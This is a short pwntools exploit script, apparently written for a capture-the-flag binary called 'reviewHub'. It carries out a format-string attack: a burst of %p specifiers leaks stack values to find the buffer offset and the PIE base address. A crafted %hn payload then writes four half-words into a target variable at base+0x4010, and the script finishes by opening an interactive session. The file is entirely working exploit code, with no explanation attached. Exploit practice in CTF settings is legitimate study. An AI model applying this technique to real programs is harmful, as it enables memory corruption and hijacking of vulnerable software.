from pwn import*

p = process('./reviewHub')

value = 0xfffffe34a58948
address = 0x4010

p.recvuntil(b'(2-1000): ')
p.sendline(b'5')

def leakBase():
    p.recvuntil(b'(up to 256 characters): ')
    payload = b'%p,' * 0x7f
    p.sendline(payload)
    p.recvuntil(b'\x1b[0m')
    p.recvuntil(b'>>> \x1b[0m')
    leak = p.recvuntil(b'\n')
    leak = leak.split(b',')
    
    offset = 0x0
    for i in range(0x7f):
        if leak[i] == b'0x70252c70252c7025' and offset == 0x0:
            offset = i+0x1
            log.success("found buffer offset: " + hex(offset))
        if leak[i][:3] == b'0x5' and leak[i-0x1][:4] == b'0x7f' and b'nil' not in leak[i-0x2]:
            base = int(leak[i], 16)
            base = base & 0xfffffffffffff000
            base = base - 0x1000
            log.success("found binary's base address: " + hex(base))
            return offset, base
    
    log.failure("could not find base address, exiting...")
    p.close()

offset, base = leakBase()
address = base + address
log.success("found var address: " + hex(address))

def overwriteExecutableFunction():
    p.recvuntil(b'(up to 256 characters): ')
    v1 = value & 0xffff
    v2 = (value >> 0x10) & 0xffff
    v3 = (value >> 0x20) & 0xffff
    v4 = (value >> 0x30) & 0xffff
    payload = bytes(f"%{v4}c%39$hn", "utf-8")
    payload += bytes(f"%{v2-v4}c%40$hn", "utf-8")
    payload += bytes(f"%{v1-v2}c%41$hn", "utf-8")
    payload += bytes(f"%{v3-v1}c%42$hn", "utf-8")
    payload += b'A' * 0x6
    payload += p64(address+0x6)
    payload += p64(address+0x2)
    payload += p64(address)
    payload += p64(address+0x4)
    p.sendline(payload)
    log.success("sent function overwrite payload")

overwriteExecutableFunction()

p.interactive()

